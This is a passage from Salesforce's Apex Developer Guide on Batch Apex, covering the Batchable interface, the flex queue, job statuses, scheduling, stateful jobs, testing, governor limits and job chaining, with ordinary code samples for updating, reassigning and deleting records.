Important: If you use an iterable, the governor limit for the total number of records retrieved by SOQL queries is still enforced.
For more information on using iterables for batch jobs, see Batch Apex Considerations and Best Practices.

**•** `execute` method:

```
     public void execute(Database.BatchableContext bc, list<P>){}

```

The `execute` method is called for each batch of records that you pass to it and takes these parameters.

**–** A reference to the `Database.BatchableContext` object.

**–** A list of sObjects, such as `List<sObject>`, or a list of parameterized types. If you’re using a `Database.QueryLocator`,
use the returned list.

Batches of records tend to execute in the order in which they’re received from the `start` method. However, the order in which
batches of records execute depends on various factors. The order of execution isn’t guaranteed.

**•** `finish` method:

```
     public void finish(Database.BatchableContext bc ){}

```

The `finish` method is called after all batches are processed and can be used to send confirmation emails or execute post-processing
operations.


Apex Developer Guide Invoking Apex

Each execution of a batch Apex job is considered a discrete transaction. For example, a batch Apex job that contains 1,000 records and
is executed without the optional _`scope`_ parameter from `Database.executeBatch` is considered five transactions of 200 records
each. The Apex governor limits are reset for each transaction. If the first transaction succeeds but the second fails, the database updates
made in the first transaction aren’t rolled back.

Use Database.BatchableContext

All the methods in the `Database.Batchable` interface require a reference to a `Database.BatchableContext` object.
Use this object to track the progress of the batch job.

The following is the instance method with the `Database.BatchableContext` object:

**Name** **Arguments** **Returns** **Description**

`getJobID` ID [Returns the ID of the AsyncApexJob object associated with](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_asyncapexjob.htm)
this batch job as a string. Use this method to track the

progress of records in the batch job. You can also use this
ID with the `[System.abortJob](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm)` method.

The following example uses the `Database.BatchableContext` to query the `AsyncApexJob` associated with the batch job.

```
   public void finish(Database.BatchableContext bc){

     // Get the ID of the AsyncApexJob representing this batch job

     // from Database.BatchableContext.

     // Query the AsyncApexJob object to retrieve the current job's information.

     AsyncApexJob a = [SELECT Id, Status, NumberOfErrors, JobItemsProcessed,

       TotalJobItems, CreatedBy.Email

       FROM AsyncApexJob WHERE Id =

       :bc.getJobId() WITH USER_MODE];

     // Send an email to the Apex job's submitter notifying of job completion.

     Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();

     String[] toAddresses = new String[] {a.CreatedBy.Email};

     mail.setToAddresses(toAddresses);

     mail.setSubject('Apex Sharing Recalculation ' + a.Status);

     mail.setPlainTextBody

     ('The batch Apex job processed ' + a.TotalJobItems +

     ' batches with '+ a.NumberOfErrors + ' failures.');

     Messaging.sendEmail(new Messaging.SingleEmailMessage[] { mail });

   }

```

Using Database.QueryLocator to Define Scope

The `start` method can return either a `Database.QueryLocator` object that contains the records to use in the batch job or
an iterable.

The following example uses a `Database.QueryLocator` :

```
   public with sharing class SearchAndReplace implements Database.Batchable<sObject>{

     public final String Query;

     public final String Entity;

     public final String Field;

     public final String Value;

```


Apex Developer Guide Invoking Apex

```
     public SearchAndReplace(String q, String e, String f, String v){

       Query=q; Entity=e; Field=f;Value=v;

     }

     public Database.QueryLocator start(Database.BatchableContext bc){

       return Database.getQueryLocator(query, AccessLevel.USER_MODE);

     }

     public void execute(Database.BatchableContext bc, List<sObject> scope){

      for(sobject s : scope){

      s.put(Field,Value);

      }

      update as user scope;

      }

     public void finish(Database.BatchableContext bc){

     }

   }

```

Using an Iterable in Batch Apex to Define Scope

The `start` method can return either a `Database.QueryLocator` object that contains the records to use in the batch job or
an iterable. Use an iterable to step through the returned items more easily.

```
   public with sharing class BatchClass implements Database.Batchable<Account> {

     public Iterable<Account> start(Database.BatchableContext info) {

      return new CustomAccountIterable();

     }

     public void execute(Database.BatchableContext info, List<Account> scope) {

      List<Account> accsToUpdate = new List<Account>();

      for (Account a : scope) {

       a.Name = 'true';

       a.NumberOfEmployees = 70;

       accsToUpdate.add(a);

      }

      update as user accsToUpdate;

     }

     public void finish(Database.BatchableContext info) {

     }

   }

```

Using the **`Database.executeBatch`** Method to Submit Batch Jobs

You can use the `Database.executeBatch` method to programmatically begin a batch job.

Important: When you call `Database.executeBatch`, Salesforce adds the process to the queue. Actual execution can be
delayed based on service availability.

The `Database.executeBatch` method takes two parameters:

**•** An instance of a class that implements the `Database.Batchable` interface.


Apex Developer Guide Invoking Apex

**•** An optional parameter _`scope`_ . This parameter specifies the number of records to pass into the `execute` method. Use this
parameter when you have many operations for each record being passed in and are running into governor limits. By limiting the
number of records, you’re limiting the operations per transaction. This value must be greater than zero. If the `start` method of
the batch class returns a QueryLocator, the optional scope parameter of `Database.executeBatch` can have a maximum
value of 2,000. If set to a higher value, Salesforce chunks the records returned by the QueryLocator into smaller batches of up to
records. If the `start` method of the batch class returns an iterable, the scope parameter value has no upper limit. However, if you
use a high number, you can run into other limits. The optimal scope size is a factor of 2000, for example, 100, 200, 400 and so on.

The `Database.executeBatch` method returns the ID of the AsyncApexJob object, which you can use to track the progress of
the job. For example:

```
   ID batchprocessid = Database.executeBatch(reassign);

   AsyncApexJob aaj = [SELECT Id, Status, JobItemsProcessed, TotalJobItems, NumberOfErrors

               FROM AsyncApexJob WHERE ID = :batchprocessid WITH USER_MODE];

```

You can also use this ID with the `[System.abortJob](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm)` method.

[For more information, see AsyncApexJob in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_asyncapexjob.htm) _Object Reference for Salesforce._

Holding Batch Jobs in the Apex Flex Queue

With the Apex flex queue, you can submit up to 100 batch jobs.

The outcome of `Database.executeBatch` is as follows.

**•** The batch job is placed in the Apex flex queue, and its status is set to `Holding` .

**•** If the Apex flex queue has the maximum number of 100 jobs, `Database.executeBatch` throws a `LimitException`
and doesn't add the job to the queue.

**•** If your org doesn’t have Apex flex queue enabled, `Database.executeBatch` adds the batch job to the batch job queue with
the `Queued` status. If the concurrent limit of queued or active batch jobs has been reached, a `LimitException` is thrown,
and the job isn’t queued.

**•** It is possible that the number of jobs in the Apex flex queue sometimes exceeds the maximum limit, resulting from parallel requests
to enqueue batch Apex jobs. Further attempts to enqueue batch jobs will encounter a `LimitException` until the queue size
drops below the maximum limit.

**Reordering Jobs in the Apex Flex Queue**

While submitted jobs have a status of `Holding`, you can reorder them in the Salesforce user interface to control which batch jobs are
processed first. To do so, from Setup, enter _`Apex Flex Queue`_ in the `Quick Find` box, then select **Apex Flex Queue** .

Alternatively, you can use Apex methods to reorder batch jobs in the flex queue. To move a job to a new position, call one of the
`[System.FlexQueue](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_flexqueue.htm)` methods. Pass the method the job ID and, if applicable, the ID of the job next to the moved job’s new position.
For example:

```
   Boolean isSuccess = System.FlexQueue.moveBeforeJob(jobToMoveId, jobInQueueId);

```

You can reorder jobs in the Apex flex queue to prioritize jobs. For example, you can move a batch job up to the first position in the
holding queue to be processed first when resources become available. Otherwise, jobs are processed “first-in, first-out”—in the order
in which they’re submitted.

When system resources become available, the system picks up the next job from the top of the Apex flex queue and moves it to the
batch job queue. The system can process up to five queued or active jobs simultaneously for each organization. The status of these
moved jobs changes from `Holding` to `Queued` . Queued jobs get executed when the system is ready to process new jobs. You can
monitor queued jobs on the Apex Jobs page.


Apex Developer Guide Invoking Apex

Batch Job Statuses

The following table lists all possible statuses for a batch job along with a description of each.

**Status** **Description**

Holding Job has been submitted and is held in the Apex flex queue until
system resources become available to queue the job for processing.

Queued Job is awaiting execution.

Preparing The `start` method of the job has been invoked. This status can
last a few minutes depending on the size of the batch of records.

Processing Job is being processed.

Aborted Job aborted by a user.

Completed Job completed with or without failure.

Failed Job experienced a system failure.

Using the **`System.scheduleBatch`** Method

You can use the `System.scheduleBatch` method to schedule a batch job to run once at a future time.

The `System.scheduleBatch` method takes these parameters.

**•** An instance of a class that implements the `Database.Batchable` interface.

**•** The job name.

**•** The time interval, in minutes, after which the job starts executing.

**•** An optional scope value. This parameter specifies the number of records to pass into the `execute` method. Use this parameter
when you have many operations for each record being passed in and are running into governor limits. By limiting the number of
records, you’re limiting the operations per transaction. This value must be greater than zero.If the `start` method of the batch class
returns a QueryLocator, the optional scope parameter of `Database.executeBatch` can have a maximum value of . If set to
a higher value, Salesforce chunks the records returned by the QueryLocator into smaller batches of up to 2,000 records. If the `start`
method of the batch class returns an iterable, the scope parameter value has no upper limit. However, if you use a high number,
you can run into other limits. The optimal scope size is a factor of 2000, for example, 100, 200, 400 and so on.

The `System.scheduleBatch` method returns the scheduled job ID (CronTrigger ID).

This example schedules a batch job to run 60 minutes from now by calling `System.scheduleBatch` . The example passes this
method an instance of a batch class (the `reassign` variable), a job name, and a time interval of 60 minutes. The optional _`scope`_
parameter has been omitted. The method returns the scheduled job ID, which is used to query CronTrigger to get the status of the
corresponding scheduled job.

```
   String cronID = System.scheduleBatch(reassign, 'job example', 60);

   CronTrigger ct = [SELECT Id, TimesTriggered, NextFireTime

             FROM CronTrigger WHERE Id = :cronID WITH USER_MODE];

   // TimesTriggered should be 0 because the job hasn't started yet.

   Assert.areEqual(0, ct.TimesTriggered);

   System.debug('Next fire time: ' + ct.NextFireTime);

   // For example:

```


Apex Developer Guide Invoking Apex

```
   // Next fire time: 2013-06-03 13:31:23

```

[For more information, see CronTrigger in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_crontrigger.htm) _Object Reference for Salesforce._

Note: Some things to note about `System.scheduleBatch` :

**•** When you call `System.scheduleBatch`, Salesforce schedules the job for execution at the specified time. Actual execution
occurs at or after that time, depending on service availability.

**•** The scheduler runs as system—all classes are executed, whether the user has permission to execute the class or not.

**•** When the job’s schedule is triggered, the system queues the batch job for processing. If Apex flex queue is enabled in your
org, the batch job is added at the end of the flex queue. For more information, see Holding Batch Jobs in the Apex Flex Queue.

**•** All scheduled Apex limits apply for batch jobs scheduled using `System.scheduleBatch` . After the batch job is queued
(with a status of `Holding` or `Queued` ), all batch job limits apply and the job no longer counts toward scheduled Apex
limits.

**•** After calling this method and before the batch job starts, you can use the returned scheduled job ID to abort the scheduled
job using the `[System.abortJob](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_system.htm)` method.

Batch Apex Examples

The following example uses a `Database.QueryLocator` :

```
   public with sharing class UpdateAccountFields implements Database.Batchable<sObject> {

     public final String Query;

     public final String Entity;

     public final String Field;

     public final String Value;

     public UpdateAccountFields(String q, String e, String f, String v) {

      Query = q;

      Entity = e;

      Field = f;

      Value = v;

     }

     public Database.QueryLocator start(Database.BatchableContext bc) {

      return Database.getQueryLocator(query, AccessLevel.USER_MODE);

     }

     public void execute(Database.BatchableContext bc, List<sObject> scope) {

      for (Sobject s : scope) {

       s.put(Field, Value);

      }

      update as user scope;

     }

     public void finish(Database.BatchableContext bc) {

     }

   }

```


Apex Developer Guide Invoking Apex

You can use this code to call the previous class.

```
   // Query for 10 accounts

   String q = 'SELECT Industry FROM Account LIMIT 10';

   String e = 'Account';

   String f = 'Industry';

   String v = 'Consulting';

   Id batchInstanceId = Database.executeBatch(new UpdateAccountFields(q,e,f,v), 5);

```

To exclude accounts or invoices that were deleted but are still in the Recycle Bin, include `isDeleted=false` in the SOQL query
WHERE clause, as shown in these modified samples.

```
   // Query for accounts that aren't in the Recycle Bin

   String q = 'SELECT Industry FROM Account WHERE isDeleted=false LIMIT 10';

   String e = 'Account';

   String f = 'Industry';

   String v = 'Consulting';

   Id batchInstanceId = Database.executeBatch(new UpdateAccountFields(q,e,f,v), 5);

   // Query for invoices that aren't in the Recycle Bin

   String q =

     'SELECT Description__c FROM Invoice_Statement__c WHERE isDeleted=false LIMIT 10';

   String e = 'Invoice_Statement__c';

   String f = 'Description__c';

   String v = 'Updated description';

   Id batchInstanceId = Database.executeBatch(new UpdateInvoiceFields(q,e,f,v), 5);

```

The following class uses batch Apex to reassign all accounts owned by a specific user to a different user.

```
   public with sharing class OwnerReassignment implements Database.Batchable<sObject> {

     public String query;

     public String email;

     public Id toUserId;

     public Id fromUserId;

     public Database.querylocator start(Database.BatchableContext bc) {

      return Database.getQueryLocator(query, AccessLevel.USER_MODE);

     }

     public void execute(Database.BatchableContext bc, List<sObject> scope) {

      List<Account> accns = new List<Account>();

      for (sObject s : scope) {

       Account a = (Account) s;

       if (a.OwnerId == fromUserId) {

        a.OwnerId = toUserId;

        accns.add(a);

       }

      }

      update as user accns;

     }

     public void finish(Database.BatchableContext bc) {

      Messaging.SingleEmailMessage mail = new Messaging.SingleEmailMessage();

```


Apex Developer Guide Invoking Apex

```
      mail.setToAddresses(new List<String>{ email });

      mail.setReplyTo('batch@acme.com');

      mail.setSenderDisplayName('Batch Processing');

      mail.setSubject('Batch Process Completed');

      mail.setPlainTextBody('Batch Process has completed');

      Messaging.sendEmail(new List<Messaging.SingleEmailMessage>{ mail });

     }

   }

```

Use this code to execute the `OwnerReassignment` class in the previous example.

```
   OwnerReassignment reassign = new OwnerReassignment();

   reassign.query = 'SELECT Id, Name, Ownerid FROM Account ' +

             'WHERE ownerid=\'' + u.id + '\'';

   reassign.email='admin@acme.com';

   reassign.fromUserId = u;

   reassign.toUserId = u2;

   ID batchprocessid = Database.executeBatch(reassign);

```

The following is an example of a batch Apex class for deleting records.

```
   public with sharing class BatchDelete implements Database.Batchable<sObject> {

     public String query;

     public Database.QueryLocator start(Database.BatchableContext bc) {

      return Database.getQueryLocator(query, AccessLevel.USER_MODE);

     }

     public void execute(Database.BatchableContext bc, List<sObject> scope) {

      delete as user scope;

      DataBase.emptyRecycleBin(scope);

     }

     public void finish(Database.BatchableContext bc) {

     }

   }

```

This code calls the `BatchDelete` batch Apex class to delete old documents. The specified query selects documents to delete for all
documents that are in a specified folder and that are older than a specified date. Next, the sample invokes the batch job.

```
   BatchDelete BDel = new BatchDelete();

   Datetime d = Datetime.now();

   d = d.addDays(-1);

   // Replace this value with the folder ID that contains

   // the documents to delete.

   String folderId = '00lD000000116lD';

   // Query for selecting the documents to delete

   BDel.query = 'SELECT Id FROM Document WHERE FolderId=\'' + folderId +

      '\' AND CreatedDate < '+d.format('yyyy-MM-dd')+'T'+

      d.format('HH:mm')+':00.000Z';

   // Invoke the batch job.

   ID batchprocessid = Database.executeBatch(BDel);

   System.debug('Returned batch process ID: ' + batchProcessId);

```


Apex Developer Guide Invoking Apex

Using Callouts in Batch Apex

To use a callout in batch Apex, specify `Database.AllowsCallouts` in the class definition. For example:

```
   public with sharing class SearchAndReplace implements Database.Batchable<sObject>,

     Database.AllowsCallouts{

   }

```

Callouts include HTTP requests and methods defined with the `webservice` keyword.

Using State in Batch Apex

Each execution of a batch Apex job is considered a discrete transaction. For example, a batch Apex job that contains 1,000 records and
is executed without the optional _`scope`_ parameter is considered five transactions of 200 records each.

If you specify `Database.Stateful` in the class definition, you can maintain state across these transactions. When using
`Database.Stateful`, only instance member variables retain their values between transactions. Static member variables don’t
retain their values and are reset between transactions. Maintaining state is useful for counting or summarizing records as they’re processed.
For example, suppose your job processes opportunity records. You can define a method in `execute` to aggregate the totals of the
opportunity amounts as they are processed.

If you don’t specify `Database.Stateful`, all static and instance member variables are set back to their original values.

The following example summarizes a custom field `total__c` as the records are processed.

```
   public with sharing class SummarizeAccountTotal implements Database.Batchable<sObject>,

   Database.Stateful {

     public final String Query;

     public integer Summary;

     public SummarizeAccountTotal(String q) {

      Query = q;

      Summary = 0;

     }

     public Database.QueryLocator start(Database.BatchableContext bc) {

      return Database.getQueryLocator(query, AccessLevel.USER_MODE);

     }

     public void execute(Database.BatchableContext bc, List<sObject> scope) {

      for (sObject s : scope) {

       Summary = Integer.valueOf(s.get('total__c')) + Summary;

      }

     }

     public void finish(Database.BatchableContext bc) {

     }

   }

```

In addition, you can specify a variable to access the initial state of the class. You can use this variable to share the initial state with all
instances of the `Database.Batchable` methods. For example:

```
   // Implement the interface using a list of Account sObjects

   // Note that the initialState variable is declared as final

   public with sharing class MyBatchable implements Database.Batchable<sObject> {

     private final String initialState;

```


Apex Developer Guide Invoking Apex

```
     String query;

     public MyBatchable(String intialState) {

      this.initialState = initialState;

     }

     public Database.QueryLocator start(Database.BatchableContext bc) {

      // Access initialState here

      return Database.getQueryLocator(query, AccessLevel.USER_MODE);

     }

     public void execute(Database.BatchableContext bc, List<sObject> batch) {

      // Access initialState here

     }

     public void finish(Database.BatchableContext bc) {

      // Access initialState here

     }

   }

```

The `initialState` stores only the _initial_ state of the class. You can’t use it to pass information between instances of the class during
execution of the batch job. For example, if you change the value of `initialState` in `execute`, the second chunk of processed
records can’t access the new value. Only the initial value is accessible.

Testing Batch Apex

When testing your batch Apex, you can test only one execution of the `execute` method. Use the _`scope`_ parameter of the
`executeBatch` method to limit the number of records passed into the `execute` method to ensure that you aren’t running into
governor limits.

The `executeBatch` method starts an asynchronous process. When you test batch Apex, make certain that the asynchronously
processed batch job is finished before testing against the results. Use the Test methods `startTest` and `stopTest` around the
`executeBatch` method to ensure that it finishes before continuing your test. All asynchronous calls made after the `startTest`
method are collected by the system. When `stopTest` is executed, all asynchronous processes are run synchronously. If you don’t
include the `executeBatch` method within the `startTest` and `stopTest` methods, the batch job executes at the end of your
test method. This execution order applies for Apex saved using API version 25.0 and later, but not for earlier versions.

For Apex saved using API version 22.0 and later, exceptions that occur during the execution of a batch Apex job invoked by a test method
are passed to the calling test method. As a result, these exceptions cause the test method to fail. If you want to handle exceptions in the
test method, enclose the code in `try` and `catch` statements. Place the `catch` block after the `stopTest` method. However, with
Apex saved using Apex version 21.0 and earlier, such exceptions don’t get passed to the test method and don’t cause test methods to
fail.

Note: Asynchronous calls, such as `@future` or `executeBatch`, called in a `startTest`, `stopTest` block, don’t count
against your limits for the number of queued jobs.

The following example tests the `OwnerReassignment` class.

```
   @IsTest

   private with sharing class OwnerReassignmentTest {

     @IsTest

     public static void testBatch() {

      user u = [

       SELECT ID, UserName

```


Apex Developer Guide Invoking Apex

```
       FROM User

       WHERE username = 'testuser1@acme.com'

       WITH USER_MODE

      ];

      user u2 = [

       SELECT ID, UserName

       FROM User

       WHERE username = 'testuser2@acme.com'

       WITH USER_MODE

      ];

      String u2id = u2.id;

      // Create 200 test accounts - this simulates one execute.

      // Important - the Salesforce test framework only allows you to

      // test one execute.

      List<Account> accns = new List<Account>();

      for (integer i = 0; i < 200; i++) {

       Account a = new Account(Name = 'testAccount' + i, Ownerid = u.ID);

       accns.add(a);

      }

      insert as user accns;

      Test.StartTest();

      OwnerReassignment reassign = new OwnerReassignment();

      reassign.query =

       'SELECT ID, Name, Ownerid ' +

       'FROM Account ' +

       'WHERE OwnerId=\'' +

       u.Id +

       '\'' +

       ' LIMIT 200';

      reassign.email = 'admin@acme.com';

      reassign.fromUserId = u.Id;

      reassign.toUserId = u2.Id;

      ID batchprocessid = Database.executeBatch(reassign);

      Test.StopTest();

      Assert.areEqual(

       Database.countquery(

        'SELECT COUNT()' + ' FROM Account WHERE OwnerId=\'' + u2.Id + '\'',

        AccessLevel.USER_MODE

       ),

       200

      );

     }

   }

```

Use the `System.Test.enqueueBatchJobs` and `System.Test.getFlexQueueOrder` methods to enqueue and
reorder no-operation jobs within the context of tests.

Batch Apex Limitations

Keep in mind these governor limits and other limitations for batch Apex.


Apex Developer Guide Invoking Apex

**•** Up to 5 batch jobs can be queued or active concurrently.

**•** Up to 100 `Holding` batch jobs can be held in the Apex flex queue.

**•** In a running test, you can submit a maximum of 5 batch jobs.

**•** The maximum number of batch Apex method executions per 24-hour period is 250,000, or the number of user licenses in your org
multiplied by 200—whichever is greater. Method executions include executions of the `start`, `execute`, and `finish` methods.
This limit is for your entire org and is shared with all asynchronous Apex: Batch Apex, Queueable Apex, scheduled Apex, and future
methods. To check how many asynchronous Apex executions are available, make a request to REST API `limits` [resource. See List](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/dome_limits.htm)
[Organization Limits in the REST API Developer Guide. If the number of asynchronous Apex executions needed by a job exceeds the](https://developer.salesforce.com/docs/atlas.en-us.262.0.api_rest.meta/api_rest/dome_limits.htm)
available number that’s calculated using the 24-hour rolling limit, an exception is thrown. Batch Apex preemptively checks the
required asynchronous job capacity when `Database.executeBatch` is called and the `start` method has returned the
workload. The batch won’t start unless there is sufficient capacity for the entire job available. For example, if the batch requires 10,000
executions and the remaining asynchronous limit is 9,500 executions, an `AsyncApexExecutions Limit exceeded`
exception is thrown, and the remaining executions are left unchanged. The license types that count toward this limit include full
Salesforce and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only users, Identity users, and Company
Communities users.

**•** A maximum of 50 million records can be returned in the `Database.QueryLocator` object. If more than 50 million records
are returned, the batch job is immediately terminated and marked as Failed.

**•** If the `start` method of the batch class returns a QueryLocator, the optional scope parameter of `Database.executeBatch`
can have a maximum value of 2,000. If set to a higher value, Salesforce chunks the records returned by the QueryLocator into smaller
batches of up to 2,000 records. If the `start` method of the batch class returns an iterable, the scope parameter value has no upper
limit. However, if you use a high number, you can run into other limits. The optimal scope size is a factor of 2000, for example, 100,
200, 400 and so on.

**•** If no size is specified with the optional _`scope`_ parameter of `Database.executeBatch`, Salesforce chunks the records returned
by the `start` method into batches of 200 records. The system then passes each batch to the `execute` method. Apex governor
limits are reset for each execution of `execute` .

**•** The `start`, `execute`, and `finish` methods can implement up to 100 callouts each.

**•** Only one batch Apex job's `start` method can run at a time in an org. Batch jobs that haven’t started yet remain in the queue until
they're started. This limit doesn’t cause any batch job to fail and `execute` methods of batch Apex jobs still run in parallel if more
than one job is running.

**•** Enqueued batch Apex jobs are processed when system resources become available. There’s no guarantee on how long it takes to
start, execute, and finish the queued jobs. You can use the Apex flex queue to prioritize jobs.

**•** Using `FOR UPDATE` in SOQL queries to lock records during update isn’t applicable to Batch Apex.

**•** `Database.QueryLocator` objects and related query results are available for 2 days, including results in nested queries. For
[more information, see API Query Cursor Limits.](https://developer.salesforce.com/docs/atlas.en-us.262.0.salesforce_app_limits_cheatsheet.meta/salesforce_app_limits_cheatsheet/salesforce_app_limits_platform_apicursors.htm)

Batch Apex Considerations and Best Practices

**•** Use extreme caution if you’re planning to invoke a batch job from a trigger. You must be able to guarantee that the trigger doesn’t
add more batch jobs than the limit. In particular, consider API bulk updates, import wizards, mass record changes through the user
interface, and all cases where more than one record can be updated at a time.

**•** When you call `Database.executeBatch`, Salesforce only places the job in the queue. Actual execution can be delayed based
on service availability and flex queue priority.

**•** When testing your batch Apex, you can test only one execution of the `execute` method. Use the _`scope`_ parameter of the
`executeBatch` method to limit the number of records passed into the `execute` method to ensure that you aren’t running
into governor limits.


Apex Developer Guide Invoking Apex

**•** The `executeBatch` method starts an asynchronous process. When you test batch Apex, make certain that the asynchronously
processed batch job is finished before testing against the results. Use the Test methods `startTest` and `stopTest` around
the `executeBatch` method to ensure that it finishes before continuing your test.

**•** Use `Database.Stateful` with the class definition if you want to share instance member variables or data across job transactions.
Otherwise, all member variables are reset to their initial state at the start of each transaction.

**•** Methods declared as `future` aren’t allowed in classes that implement the `Database.Batchable` interface.

**•** Methods declared as `future` can’t be called from a batch Apex class.

**•** When a batch Apex job is run, email notifications are sent to the user who submitted the batch job. If the code is included in a
managed package and the subscribing org is running the batch job, notifications are sent to the recipient listed in the `Apex`
`Exception Notification Recipient` field.

**•** Each method execution uses the standard governor limits anonymous block, Visualforce controller, or WSDL method.

**•** Each batch Apex invocation creates an `AsyncApexJob` record. To construct a SOQL query to retrieve the job’s status, number
of errors, progress, and submitter, use the `AsyncApexJob` record’s ID. For more information about the `AsyncApexJob` object,
[see AsyncApexJob in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_asyncapexjob.htm) _Object Reference for Salesforce._

**•** For each 10,000 `AsyncApexJob` records, Apex creates an `AsyncApexJob` record of type `BatchApexWorker` for internal
use. When querying for all `AsyncApexJob` records, we recommend that you filter out records of type `BatchApexWorker`
using the `JobType` field. Otherwise, the query returns one more record for every 10,000 `AsyncApexJob` records. For more
information about the `AsyncApexJob` [object, see AsyncApexJob in the](https://developer.salesforce.com/docs/atlas.en-us.262.0.object_reference.meta/object_reference/sforce_api_objects_asyncapexjob.htm) _Object Reference for Salesforce._

**•** All implemented `Database.Batchable` interface methods must be defined as `public` or `global` .

**•** For a sharing recalculation, we recommend that the `execute` method delete and then re-create all Apex managed sharing for
the records in the batch. This process ensures that sharing is accurate and complete.

**•** Batch jobs queued before a Salesforce service maintenance downtime remain in the queue. After service downtime ends and when
system resources become available, the queued batch jobs are executed. If a batch job is running when downtime occurred, the
batch execution is rolled back and restarted after the service comes back up. Because execute methods can therefore run multiple
[times, any non-transactional operations, such as callouts, can be retried. All non-transactional operations must follow Idempotent](https://developer.salesforce.com/docs/atlas.en-us.262.0.integration_patterns_and_practices.meta/integration_patterns_and_practices/integ_pat_remote_process_invocation_state.htm#idempotent_design_header)
[Design Considerations to maintain data integrity.](https://developer.salesforce.com/docs/atlas.en-us.262.0.integration_patterns_and_practices.meta/integration_patterns_and_practices/integ_pat_remote_process_invocation_state.htm#idempotent_design_header)

**•** Minimize the number of batches, if possible. Salesforce uses a queue-based framework to handle asynchronous processes from such
sources as future methods and batch Apex. This queue is used to balance request workload across organizations. If more than 2,000
unprocessed requests from a single organization are in the queue, any additional requests from the same organization are delayed
while the queue handles requests from other organizations.

**•** Salesforce recommends that you design your asynchronous Apex jobs to handle variations in processing time. For example, to
handle potential processing overlaps, consider chaining batch jobs on page 320 instead of scheduling jobs at fixed intervals.

**•** Ensure that batch jobs execute as fast as possible. To ensure fast execution of batch jobs, minimize Web service callout times and
tune the queries used in your batch Apex code. The longer the batch job executes, the more likely other queued jobs are delayed
when many jobs are in the queue.

**•** If you use batch Apex with `Database.QueryLocator` to access external objects via an OData adapter for Salesforce Connect:

**–** Enable Request Row Counts on the external data source, and each response from the external system must include the total
row count of the result set.

**–** We recommend enabling Server-Driven Pagination on the external data source and having the external system determine page
sizes and batch boundaries for large result sets. Typically, server-driven paging can adjust batch boundaries to accommodate
changing datasets more effectively than client-driven paging.

When Server-Driven Pagination is disabled on the external data source, the OData adapter controls the paging behavior
(client-driven). If external object records are added to the external system while a job runs, other records can be processed twice.
If external object records are deleted from the external system while a job runs, other records can be skipped.


Apex Developer Guide Invoking Apex

**–** When Server-Driven Pagination is enabled on the external data source, the batch size at runtime is the smaller of these two sizes:

**•** Batch size specified in the `scope` parameter of `Database.executeBatch` . The default is 200 records.

**•** Page size returned by the external system. We recommend that you set up your external system to return page sizes of 200
or fewer records.

**•** Batch Apex jobs run faster when the `start` method returns a `QueryLocator` object that doesn't include related records via
a subquery. Avoiding relationship subqueries in a `QueryLocator` allows batch jobs to run using a faster, chunked implementation.
If the `start` method returns an iterable or a `QueryLocator` object with a relationship subquery, the batch job uses a slower,
non-chunking, implementation. For example, if this query is used in the `QueryLocator`, the batch job uses a slower implementation
because of the relationship subquery:

```
     SELECT Id, (SELECT id FROM Contacts) FROM Account

```

A better strategy is to perform the subquery separately, from within the `execute` method, which allows the batch job to run
using the faster, chunking implementation.

**•** To implement record locking as part of the batch job, you can requery records inside the `execute` method, using FOR UPDATE.
Requerying records in this manner ensures that conflicting updates aren’t overwritten by DML in the batch job. To requery records,
simply select the `Id` field in the batch job's main query locator.

**•** The Salesforce Platform's flow control mechanism and fair-usage algorithm can cause a delay in running batch jobs.

Chaining Batch Jobs

Starting with API version 26.0, you can start another batch job from an existing batch job to chain jobs together. Chaining enforces strict
sequential execution, ensuring that one job fully completes before the next one starts. This sequencing prevents situations where multiple
batch jobs attempt to concurrently process the same records, which can lead to race conditions or data inconsistencies. Use chained
batch jobs if you require sequential execution and batch processing, such as processing large data volumes. Otherwise, if batch processing
isn’t needed, consider using Queueable Apex.

You can chain a batch job by calling `Database.executeBatch` or `System.scheduleBatch` from the `finish` method
of the current batch class. The new batch job starts after the current batch job finishes.

A potential failure point in chained batch jobs is an unhandled exception within the job’s `finish` method. The unhandled exception
prevents the next job from being enqueued and breaks the sequence. To safeguard against this point of failure, consider implementing
a separate scheduled Apex job that periodically checks the status of the chain. The scheduled job queries the `AsyncApexJob` object
for records where the `JobType` is `'BatchApex'` and the `ApexClass.Name` matches the class expected to be currently running
or queued within the chain. If this query returns no results, the expected job is neither running nor queued, which signifies that the chain
has been unexpectedly interrupted. The scheduled job then restarts the entire batch chain, which prevents unprocessed records from
accumulating and possibly reaching governor limits.

When creating a long chain of batch jobs, account for workload variations. If there's currently no further work to perform either in the
current job’s `finish` method or because your business is entering an off-peak period, use `System.scheduleBatch` to add a
delay before the execution of next chained batch job. This delay optimizes the usage of available batch jobs and the flex queue by
preventing jobs that don't have any work from repeatedly starting.


Apex Developer Guide Invoking Apex

Note: For API version 25.0 and earlier, you can’t call `Database.executeBatch` or `System.scheduleBatch` from
any batch Apex method.

The API version that’s used is the version of the running batch class that starts or schedules another batch job. If the `finish`
method in the running batch class calls a method in a helper class to start the next batch job, the API version of the helper class
doesn’t matter.

SEE ALSO:

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_interface_database_batchable.htm)_ : Batchable Interface

_[Apex Reference Guide](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_class_System_FlexQueue.htm)_ :FlexQueue Class

_Apex Reference Guide_ [: Test.enqueueBatchJobs()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_test.htm)

_Apex Reference Guide_ [: Test.getFlexQueueOrder()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_test.htm)

_Salesforce Help_ [: Client-driven and Server-driven Paging for Salesforce Connect—OData 2.0 and 4.0 Adapters](https://help.salesforce.com/articleView?id=odata_paging.htm&language=en_US)

